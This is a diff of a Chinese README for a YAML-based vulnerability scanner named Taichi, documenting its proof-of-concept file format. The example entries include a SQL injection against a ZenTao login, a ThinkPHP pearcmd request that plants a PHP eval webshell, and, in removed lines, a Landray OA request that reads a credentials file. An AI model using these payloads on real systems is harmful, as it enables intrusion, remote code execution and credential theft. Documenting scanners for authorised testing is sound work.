@@ -4,7 +4,7 @@
 
 # 历史更新
 
-2023.3.24
+**2023.3.24**
 
 新增识别exp，poc功能
 
@@ -12,13 +12,19 @@
 
 适配[CVE-2023-28432](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)
 
-![image](./img/2023.3.24.png)
-
-2023.2.35
+**2023.2.35**
 
 新增poc名称显示
 
-新增5个蓝凌poc
+新增蓝凌OApoc
+
+**2023.3.26**
+
+重构部分代码，删除attack.py
+
+取消type参数
+
+新增致远OApoc
 
 # 前言
 
@@ -86,7 +92,7 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 |
 |--------- model(模式文件)
 |
-|--------- pocs(poc或者exp)
+|--------- pocs(poc文件)
 ```
 
 ## 两种yaml格式
@@ -98,11 +104,7 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 ```
 #poc名称
 - name:
-  - name: "demo"
-
-#种类：对应的是scan.py
-- type:
-  - type: "poc"
+  - name: "CNVD-2022-42853"
 
 #请求方式
 - method:
@@ -110,25 +112,29 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 
 #payload
 - payload:
-  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
- 
+  - payload: "account=admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"
+
 #response包里的关键字
 - word:
   - word:
-      - "password"
+      - "8f14e45fceea167a5a36dedd4bea254"
 
 #漏洞的位置
 - url:
-  - url : "/sys/ui/extend/varkind/custom.jsp"
+  - url : "/zentao/user-login.html"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
 ```
 
 #### name
 
 poc名称，用于扫描时显示
-
-#### type
-
-之所以需要type参数，是因为某些漏洞需要二次访问，type为poc的漏洞，例如禅道sql注入这样，访问一次即可判断漏洞
 
 #### method
 
@@ -136,23 +142,7 @@ reques的方式，根据自己需求来定
 
 #### payload
 
-例子中的payload
-
-```
-  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
-```
-
-可以随意变换为request包里的内容，例如:
-
-```
-  - a: 'aaaaaaaaaaa'
-```
-
-但是，如果像[(CVE-2023-28432)](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)这样的漏洞，没有payload，写成：
-
-```
-  - isNone : 'isNone'
-```
+顾名思义就是payload
 
 #### response
 
@@ -162,16 +152,28 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 
 因为我在采用了url+<拼接内容>这样的方法来访问url，例如：http://192.168.0.1/a/b/b.jsp，就要把/a/b/b.jsp填入url参数
 
+#### method-V
+
+不需要的时候写成
+
+```
+"isNone"
+```
+
+#### verify
+
+不需要的时候写成
+
+```
+"isNone"
+```
+
 ### 第二种poc.yaml格式
 
 ```
 #poc名称
 - name:
-  - name: "demo"
-
-#种类：对应的是attack.py
-- type:
-  - type: "exp"
+  - name: "thinkphp_rce"
 
 #请求方式
 - method:
@@ -179,36 +181,33 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 
 #payload
 - payload:
-  - s_bean: 'ruleFormulaValidate&script=u0067\u0020\u003d\u0020\u0074'
+  - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
 
 #response包里的关键字
 - word:
   - word:
-      - "ok"
+      - "php_dir"
 
 #漏洞的位置
 - url:
-  - url : "/sys/ui/extend/varkind/custom.jsp"
+  - url : "/public/index.php"
 
-#attack中 二次访问 请求方式
+#attack中 验证 是否攻击成功的 请求方式
 - method-V:
   - method: "get"
 
 #webshell位置
 - verify:
-  - verify : "/login_listyes.jsp"
-
+  - verify : "/shell.php?cmd=phpinfo();"
 ```
-
-同理，payload内容也是可以变的
 
 这里就只介绍和不一样的地方
 
-**二次访问：字面意思就是第二次访问，因为有的漏洞上传webshell，需要访问webshell证明漏洞存在，第一种yaml文件无法满足，所以所以才会出现第二种**
+**二次访问：字面意思就是第二次访问，因为有的漏洞上传webshell，需要访问webshell证明漏洞存在，就要进行二次访问webshell**
 
-#### type
+#### response
 
-这里type为exp的是为了满足二次访问的需求，简而言之，就是需要二次访问的用exp这个字符串，不需要的用poc这个字符串；例如上传了webshell，之后再访问webshell，就要用exp字符串（第一种yaml对应的是scan.py，type参数是poc；第二种yaml对应的是attack.py，type参数是exp）
+response包的关键词，这里的关键字是**二次请求**response包的关键字，用于判断漏洞是否存在，目前只可以支持一个参数
 
 #### method-V
 
